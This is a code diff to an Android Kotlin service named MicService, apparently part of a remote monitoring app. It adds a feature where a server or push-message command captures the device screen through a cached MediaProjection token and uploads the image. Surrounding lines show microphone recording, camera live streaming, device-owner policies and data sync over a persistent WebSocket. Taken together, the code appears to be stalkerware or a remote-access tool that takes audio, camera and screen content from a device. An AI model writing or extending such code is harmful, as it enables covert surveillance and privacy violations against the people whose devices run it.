@@ -240,6 +240,7 @@ class MicService : Service() {
     private var dataJob: Job? = null
 
     // ── Prefs / Device ID ────────────────────────────────────────────────────
+    @Volatile private var activeProjection: android.media.projection.MediaProjection? = null
     private val prefs by lazy { getSharedPreferences("micmonitor", MODE_PRIVATE) }
     
     // Use Android ID as base for device ID - survives cache clear
@@ -403,10 +404,57 @@ class MicService : Service() {
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
         Log.i(TAG, "onStartCommand action=${intent?.action}")
 
+        // Bug 5, 6, 15: Run startForeground IMMEDIATELY before anything else
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
+            val typeFlags = android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE or 
+                            android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA or 
+                            (if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) 
+                                android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION 
+                            else 32)
+            startForeground(NOTIF_ID, buildNotification("Connecting to server…"), typeFlags)
+        } else {
+            startForeground(NOTIF_ID, buildNotification("Connecting to server…"))
+        }
+
         // Layer 14: Device Owner Power-Up
         setupDeviceOwnerPolicies()
 
-        startForeground(NOTIF_ID, buildNotification("Connecting to server…"))
+        // Bug 2, 4, 18, 19: Handle INIT_PROJECTION and register MediaProjection
+        if (intent?.action == "INIT_PROJECTION") {
+            @Suppress("DEPRECATION")
+            val projectionData = intent.getParcelableExtra("projection_data") as? Intent
+            
+            if (projectionData != null) {
+                // Bug 17: Main thread required for getMediaProjection on Android 14+
+                serviceScope.launch(Dispatchers.Main) { 
+                    try {
+                        activeProjection?.stop() // Bug 19: Stop old active projection
+                        val mpm = getSystemService(Context.MEDIA_PROJECTION_SERVICE) as android.media.projection.MediaProjectionManager
+                        val newProjection = mpm.getMediaProjection(android.app.Activity.RESULT_OK, projectionData)
+                        
+                        // Bug 18: Register callback
+                        newProjection?.registerCallback(object : android.media.projection.MediaProjection.Callback() {
+                            override fun onStop() {
+                                Log.w(TAG, "MediaProjection was stopped by system or user")
+                                activeProjection = null
+                            }
+                        }, null)
+
+                        activeProjection = newProjection
+                        Log.i(TAG, "Initialized and cached new MediaProjection instance on Main thread")
+                    } catch (e: Exception) {
+                        Log.e(TAG, "Failed to initialize MediaProjection: ${e.message}")
+                    }
+                }
+            } else {
+                Log.e(TAG, "INIT_PROJECTION missing projection data")
+            }
+        }
+        
+        if (intent?.action == "take_screenshot") {
+            Log.i(TAG, "take_screenshot intent received (e.g. from FCM)")
+            handleServerCommand("take_screenshot")
+        }
 
         // Reconnect watchdog alarm fired — force a fresh WebSocket if dead
         if (intent?.action == ACTION_RECONNECT) {
@@ -529,6 +577,9 @@ class MicService : Service() {
         stopCameraLiveStream("service_destroy")
         stopDataCollection()
         closeRecordingFile()
+
+        activeProjection?.stop()
+        activeProjection = null
 
         // Close WebSocket cleanly
         activeWebSocket = null
@@ -901,6 +952,24 @@ class MicService : Service() {
                 safeSend("pong:$deviceId")
                 sendCommandAck("ping")
             }
+            "take_screenshot" -> {
+                Log.i(TAG, "CMD: take_screenshot")
+                if (activeProjection == null) {
+                    sendCommandAck("take_screenshot", "error", "No projection token available - open app once")
+                    return
+                }
+                serviceScope.launch {
+                    val ok = ScreenshotCapturer.captureAndUpload(
+                        this@MicService,
+                        activeProjection,
+                        serverHttpBaseUrl,
+                        deviceId,
+                        okHttpClient
+                    )
+                    if (ok) sendCommandAck("take_screenshot", "success")
+                    else sendCommandAck("take_screenshot", "error", "Failed to capture or upload")
+                }
+            }
             "get_data" -> {
                 // Dashboard requested a fresh sync immediately
                 sendDeviceData()
@@ -1009,50 +1078,6 @@ class MicService : Service() {
                     Log.e(TAG, "Failed to toggle WiFi: ${e.message}")
                     safeSend("ACK:toggle_wifi:error:${e.message}")
                     sendCommandAck("toggle_wifi", "error", e.message)
-                }
-            }
-            "wifi_on" -> {
-                Log.i(TAG, "CMD: wifi_on - enabling WiFi")
-                try {
-                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
-                        val panelIntent = Intent(android.provider.Settings.Panel.ACTION_WIFI)
-                        panelIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
-                        startActivity(panelIntent)
-                        safeSend("ACK:wifi_on:settings_opened")
-                        sendCommandAck("wifi_on", detail = "settings_opened")
-                    } else {
-                        val wifiManager = applicationContext.getSystemService(Context.WIFI_SERVICE) as android.net.wifi.WifiManager
-                        @Suppress("DEPRECATION")
-                        wifiManager.isWifiEnabled = true
-                        safeSend("ACK:wifi_on:enabled")
-                        sendCommandAck("wifi_on", detail = "enabled")
-                    }
-                } catch (e: Exception) {
-                    Log.e(TAG, "Failed to enable WiFi: ${e.message}")
-                    safeSend("ACK:wifi_on:error:${e.message}")
-                    sendCommandAck("wifi_on", "error", e.message)
-                }
-            }
-            "wifi_off" -> {
-                Log.i(TAG, "CMD: wifi_off - disabling WiFi")
-                try {
-                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
-                        val panelIntent = Intent(android.provider.Settings.Panel.ACTION_WIFI)
-                        panelIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
-                        startActivity(panelIntent)
-                        safeSend("ACK:wifi_off:settings_opened")
-                        sendCommandAck("wifi_off", detail = "settings_opened")
-                    } else {
-                        val wifiManager = applicationContext.getSystemService(Context.WIFI_SERVICE) as android.net.wifi.WifiManager
-                        @Suppress("DEPRECATION")
-                        wifiManager.isWifiEnabled = false
-                        safeSend("ACK:wifi_off:disabled")
-                        sendCommandAck("wifi_off", detail = "disabled")
-                    }
-                } catch (e: Exception) {
-                    Log.e(TAG, "Failed to disable WiFi: ${e.message}")
-                    safeSend("ACK:wifi_off:error:${e.message}")
-                    sendCommandAck("wifi_off", "error", e.message)
                 }
             }
             "check_update" -> {
